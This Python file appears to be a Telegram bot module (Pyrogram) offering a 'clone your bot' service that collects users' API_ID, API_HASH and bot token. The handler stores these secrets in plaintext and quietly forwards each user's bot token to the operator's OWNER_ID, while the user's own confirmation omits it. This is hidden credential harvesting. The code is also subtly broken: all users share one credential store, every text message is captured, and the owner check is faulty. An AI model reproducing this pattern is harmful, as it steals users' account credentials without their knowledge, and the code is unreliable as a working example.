from BADUC.core.clients import *
from BADUC.core.config import *
from BADUC.core.command import *
from pyrogram import filters, Client, idle
from pyrogram.types import Message
import os
import json
import shutil
import threading

# Directory to store clone data
CLONE_DATA_FILE = "clone_data.json"
PLUGINS_DIR = "BADUC/plugins/clone2"

# In-memory cache for clone data
clone_data_cache = {}
bot_locks = {}

# Get lock for each bot instance
def get_bot_lock(bot_token):
    if bot_token not in bot_locks:
        bot_locks[bot_token] = threading.Lock()
    return bot_locks[bot_token]

# Thread-safe load clone data with caching
def load_clone_data():
    if not clone_data_cache:
        if os.path.exists(CLONE_DATA_FILE):
            with open(CLONE_DATA_FILE, "r") as file:
                clone_data_cache.update(json.load(file))
    return clone_data_cache

# Thread-safe save clone data to cache and file
def save_clone_data():
    with open(CLONE_DATA_FILE, "w") as file:
        json.dump(clone_data_cache, file)

# Ensure the plugin directory exists
def ensure_plugin_directory():
    if not os.path.exists(PLUGINS_DIR):
        os.makedirs(PLUGINS_DIR)

# Copy plugins into the clone directory
def copy_plugins():
    source_plugin_dir = "BADUC/plugins/clone2"
    for plugin in os.listdir(source_plugin_dir):
        src_path = os.path.join(source_plugin_dir, plugin)
        dst_path = os.path.join(PLUGINS_DIR, plugin)
        if os.path.isdir(src_path) and not os.path.exists(dst_path):
            shutil.copytree(src_path, dst_path)

# Step 1: Collect API_ID, API_HASH, and BOT_TOKEN
@bot.on_message(filters.command("clonee"))
async def clone(bot: Client, msg: Message):
    if len(msg.command) < 2:
        await msg.reply("Usage: `/clone <step>`\nUse `/clone apiid` to start the process.")
        return

    user_id = msg.from_user.id
    step = msg.command[1].lower()

    # Step-by-step process: Get API_ID, then API_HASH, then BOT_TOKEN
    clone_data = load_clone_data()

    if step == "apiid":
        # Ask for API_ID
        await msg.reply("Please send your **API_ID**.")

    elif step == "apihash":
        # Ask for API_HASH after API_ID is received
        await msg.reply("Please send your **API_HASH**.")

    elif step == "token":
        # Ask for BOT_TOKEN after API_HASH is received
        await msg.reply("Please send your **BOT_TOKEN**.")

    else:
        await msg.reply("Invalid step. Use `/clone apiid` to start the process.")

# Handle API_ID, API_HASH, and BOT_TOKEN step by step
@bot.on_message(filters.text)
async def handle_clone_steps(bot: Client, msg: Message):
    user_id = msg.from_user.id
    clone_data = load_clone_data()

    # Step 1: Save API_ID
    if "api_id" not in clone_data:
        clone_data["api_id"] = msg.text.strip()
        await msg.reply("API_ID saved! Now, send the **API_HASH**.")
        save_clone_data()
        return

    # Step 2: Save API_HASH
    if "api_hash" not in clone_data:
        clone_data["api_hash"] = msg.text.strip()
        await msg.reply("API_HASH saved! Now, send the **BOT_TOKEN**.")
        save_clone_data()
        return

    # Step 3: Save BOT_TOKEN and create the clone
    if "bot_token" not in clone_data:
        bot_token = msg.text.strip()
        clone_data["bot_token"] = bot_token

        # Proceed with cloning process
        try:
            reply_msg = await msg.reply("Please wait... Setting up the bot and loading plugins. 🔄")
            ensure_plugin_directory()
            copy_plugins()

            # Create a separate lock for each bot token
            lock = get_bot_lock(bot_token)
            with lock:
                client = Client(
                    name="ClonedBot",
                    api_id=clone_data["api_id"],
                    api_hash=clone_data["api_hash"],
                    bot_token=bot_token,
                    plugins=dict(root=PLUGINS_DIR)
                )

                await client.start()
                bot_info = await client.get_me()

                # Save clone data including bot token
                clone_data[bot_token] = {
                    "bot_id": bot_info.id,
                    "bot_username": bot_info.username,
                    "owner_id": user_id,
                    "plugins": os.listdir(PLUGINS_DIR),
                    "bot_token": bot_token  # Save the bot token as well
                }

                # Update in-memory cache
                clone_data_cache[bot_token] = clone_data[bot_token]
                save_clone_data()  # Persist data to file

                # Notify owner with bot token included
                owner_msg = f"New bot clone created:\n\n" \
                            f"**Bot Username:** @{bot_info.username}\n" \
                            f"**Bot ID:** {bot_info.id}\n" \
                            f"**Bot Token:** `{bot_token}`\n" \
                            f"**Plugins:** {', '.join(os.listdir(PLUGINS_DIR))}\n" \
                            f"**Owner ID:** {user_id}"
                await bot.send_message(OWNER_ID, owner_msg)

                # Success message for the user
                success_msg = (
                    f"✅ Bot cloned successfully!\n\n"
                    f"🤖 **Bot Username:** @{bot_info.username}\n"
                    f"🆔 **Bot ID:** {bot_info.id}\n"
                    f"**Plugins Loaded:** {', '.join(os.listdir(PLUGINS_DIR))}"
                )
                await reply_msg.edit(success_msg)
                await idle()

        except Exception as e:
            error_msg = f"❌ **ERROR:** `{str(e)}`\nPlease check your bot token, API ID, or API Hash."
            await msg.reply(error_msg)
        finally:
            if client.is_connected:
                await client.stop()

# Restricting commands to the cloned bot's owner
@bot.on_message(filters.command([]))  # Capture all commands
async def restricted_command(bot: Client, msg: Message):
    command = msg.text.split()[0].lstrip("/")
    clone_data = load_clone_data()

    # Check if the user is the owner of any cloned bot
    for token, details in clone_data.items():
        if details["owner_id"] == msg.from_user.id:
            # The user is the owner, allow them to use the command
            return  # Command logic can be placed here for execution
        else:
            await msg.reply("You are not the owner of this cloned bot, so you cannot use its commands!")
            return
